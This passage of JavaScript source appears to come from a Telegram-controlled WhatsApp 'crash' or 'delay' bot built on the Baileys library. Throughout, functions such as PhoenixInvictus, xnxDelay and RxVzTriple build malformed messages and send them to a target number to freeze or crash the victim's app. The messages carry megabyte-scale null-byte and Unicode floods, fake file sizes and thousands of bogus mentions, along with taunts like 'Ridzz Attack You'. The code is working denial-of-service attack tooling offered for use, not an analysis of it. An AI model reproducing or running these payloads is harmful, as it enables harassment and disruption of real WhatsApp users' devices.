            ephemeralMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "999999999999",
                        pageCount: 1316134911,
                        height: 999999999,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "nj" + "ꦾ".repeat(60000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703"
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: ".",
                                matchedText: "https://t.me/",
                                description: "!.",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { messageId: null, participant: { jid: target } });
    }
}

async function PhoenixInvictus(sock, target) {
  const statusCards = Array(1000).fill().map(() => ({
    body: { 
      text: "\0" 
    },
    footer: { 
      text: "Ridzz Attack You" 
    },
    header: {
      title: "\0",
      imageMessage: {
        url: "https://mmg.whatsapp.net/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "JBsntfn6t5hXBp2VH91K2tuMf49pmFPIwFjshrA2WhI=",
        fileLength: "131220",
        height: 1024,
        width: 1024,
        directPath: "/m1/v/t24/An-qss16gfa27i8We5RUTHibYUzSuagepuRHNmgi77hh17XMu07yngcd4N4Q1lXyqymQ1MRqnOjUJqm4bOPAxDFF_S_YBvqnI_SrYg7-KcGoGdZ2Jlvj0-EUl-FoHxozVA?ccb=10-5&oh=01_Q5Aa3gH5jIXgo_TCy55Ec51fAc31uBa4R28GUnNS6f3hORc80w&oe=698C995A&_nc_sid=5e03e0",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAsAAABBQEAAAAAAAAAAAAAAAAGAAECAwQFAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAAjaSKhcpqAAwzuEHL6cCbPQNpoYiooldG05urNwwlkP90Usm4r0KsCs5PeDWSyggRckxNajE//xAAnEAACAgIBAwMEAwAAAAAAAAABAgADBBERSBBAREyFBUxQv/aAAgBAQABPwAH2jAMNEQDi2vJBnXKWF4s+DACSAJgYyVNVtxzCe3bLwrMt/LhQp+3sRuNYiFQT5Mvx0yK2R/IMp6QlFwd25Sqm0dVZz4UCAgx+OwD89vIEbHD2I5PleyXrZc1YB2sZFVtHwG+ZXQ1TEq5I/BgIf8ARE2N6jWWJYANan1Fc+oXf6helX5jezPWR0IMptDALvyJqYd1myl/9qiGlWYtyP3Q4w8aM9BdERKB55e+4uOgBE9AJtlJ3FOwDL1QlnDaZhx3MvJysdUr9TyDOndRyL7lqeyWZVdT6fwPzD1bBB1zlV1dy8q2BHZgdggyjMetnZ9sNeIbDY5ZwWgsXGcBBo695dfbaxLuT26CbOVg/wAQ9qOi1VhxY/Kfx2NTU3BJkV2JkOLPeOpExsDIySOCeJg4a4lPAR1LIQDo/BlCOlYWx+Tfmf/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AB//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AB//Z",
        mediaKeyTimestamp: "1760318502",
        hasMediaAttachment: true,
      },
      nativeFlowMessage: {}
    }
  }));

  const interactiveResponseMsg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `628${i + 1}@s.whatsapp.net`
        ),
      },
      body: { 
        text: "Ridzz Attack You", 
        format: "DEFAULT" 
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
        version: 3,
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    { 
      groupStatusMessageV2: { 
        message: interactiveResponseMsg.message 
      } 
    },
    { 
      messageId: interactiveResponseMsg.key.id, 
      participant: { jid: target } 
    }
  );

  const groupStatusMsgV2 = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: { 
            title: "" 
          },
          body: { 
            text: "Ridzz Attack You" + "\u0003".repeat(800000) 
          },
          carouselMessage: { 
            cards: statusCards 
          },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    groupStatusMsgV2.message,
    { 
      messageId: groupStatusMsgV2.key.id, 
      participant: { jid: target } 
    }
  );

  const viewOnceMsg2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\u0000".repeat(1000), 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3,
          },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    { 
      groupStatusMessageV2: { 
        message: viewOnceMsg2.message 
      } 
    },
    { 
      participant: { jid: target } 
    }
  );

  const groupStatusMsg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: { 
            title: "Ridzz Attack You" 
          },
          body: { 
            text: "tonight might be the night we kiss for the first time." + "\0".repeat(900000) 
          },
          nativeFlowMessage: {
            messageParamsJson: "Y",
            buttons: [
              { 
                name: "cta_url", 
                buttonParamsJson: "{}" 
              },
              { 
                name: "call_permission_request", 
                buttonParamsJson: "{}" 
              },
            ],
          },
        },
      },
    },
  }, {});

  await sock.relayMessage(
    target,
    groupStatusMsg.message,
    { 
      participant: { jid: target } 
    }
  );
}

async function xnxDelay(sock, target) {
  const currentRepeatCount = 1000000;

  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: " -- Xwarrxxx", format: "EXTENSIONS_1" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(currentRepeatCount),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  });

  await sock.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target });

  const msg2 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Xwarrxxx -", format: "BOLD" },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(currentRepeatCount),
            version: 3
          },
          contextInfo: {
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }
  }, {
    userJid: target,
    messageId: undefined,
    messageTimestamp: (Date.now() / 1000) | 0
  });

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target });

  const Audio = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "133@newsletter",
                serverMessageId: 1,
                newsletterName: "𞋯"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

  await sock.relayMessage("status@broadcast", msgAudio.message, {
    messageId: msgAudio.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  const stickerMsg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", stickerMsg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  await sock.relayMessage(
    target,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " - Xwarrxxx ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "XNX DELAY MEMASAK",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
  console.log(`SUCCES SENDING DELAY HARD TO ${target}`);
}

async function RxVzTriple(sock, target) {
  try {
    const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

    const msgNewsletter = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        newsletterAdminInviteMessage: {
          newsletterJid: "120363000000000000@newsletter",
          newsletterName: "△⃟𝐑𝐱𝐕𝐳◯" + "ꦾ".repeat(30000),
          jpegThumbnail: Buffer.alloc(0),
          caption: "ꦾ".repeat(30000) + "𑜦𑜠".repeat(30000),
          inviteExpiration: 0,
          contextInfo: {
            mentionedJid: ["6281234567890@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            externalAdReply: {
              title: "You Know RxVz?",
              body: "Hufttt",
              mediaType: 1,
              thumbnailUrl: "https://g.top4top.io/p_3720lu4u11.jpg",
              sourceUrl: "https://whatsapp.com/channel"
            }
          }
        }
      }),
      { userJid: sock.user.id }
    );
    await sock.relayMessage(target, msgNewsletter.message, { messageId: msgNewsletter.key.id });

    const msgGroup = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupInviteMessage: {
          groupJid: "120363000000000000@g.us",
          inviteCode: "RxVzXVsx999",
          inviteExpiration: Math.floor(Date.now() / 1000) + 259200,
          groupName: "ꦾ".repeat(30000) + ":҉⃝҉".repeat(30000),
          caption: "ꦾ".repeat(30000) + "ꦽ".repeat(30000) + "𑇂𑆵𑆴𑆿".repeat(30000),
          jpegThumbnail: Buffer.alloc(0)
        }
      }),
      { userJid: sock.user.id }
    );
    await sock.relayMessage(target, msgGroup.message, { messageId: msgGroup.key.id });

    const msgLocation = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        locationMessage: {
          degreesLatitude: 1e15,
          degreesLongitude: 1e15,
          name: "ြ".repeat(30000),
          address: "ြ".repeat(30000),
          isLive: true,
          accuracyInMeters: 1e15,
          url: "https://maps.google.com/?q=-6.200000,106.816666",
          jpegThumbnail: Buffer.alloc(0),
          contextInfo: {
            mentionedJid: ["6281234567890@s.whatsapp.net"],
            externalAdReply: {
              title: "Anti ban atau ninjayu?",
              body: "Kasi klzz",
              mediaType: 1,
              thumbnailUrl: "https://files.catbox.moe/4x0k9s.jpg",
              sourceUrl: "https://maps.google.com"
            }
          }
        }
      }),
      { userJid: sock.user.id }
    );
    await sock.relayMessage(target, msgLocation.message, { messageId: msgLocation.key.id });

  } catch (err) {
  }
}

async function Luminousdelay(sock, target) {
  const interactiveResponseMessage = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: [target],
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 999,
          newsletterName: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}",
          accessibilityText: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}˒"
        },
        statusAttributions: [
          {
            type: "GROUP_STATUS",
            music: {
              authorName: " #zephyrine ",
              songId: "0.166995064884651",
              title: " #zephyrine ",
              author: " #zephyrine ",
              artistAttribution: "t.me/pherine",
              isExplicit: true
            }
          },
          {
            type: 5,
            music: {
              songId: "0.020762887690758847",
              title: " #zephyrine ",
              author: " #zephyrine ",
              artistAttribution: "t.me/pherine",
              isExplicit: true
            }
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, interactiveResponseMessage, {});
}
// END FUNCTION
// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    antiTamper();

    currentMode = getMode();

    console.log("🚀 Starting WhatsApp session...");
    await startSesi();

    console.log("🚀 Starting Telegram bot...");
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      console.log("🔄 Restarting...");
      process.exit(1);
    }, 3000);
  }
})();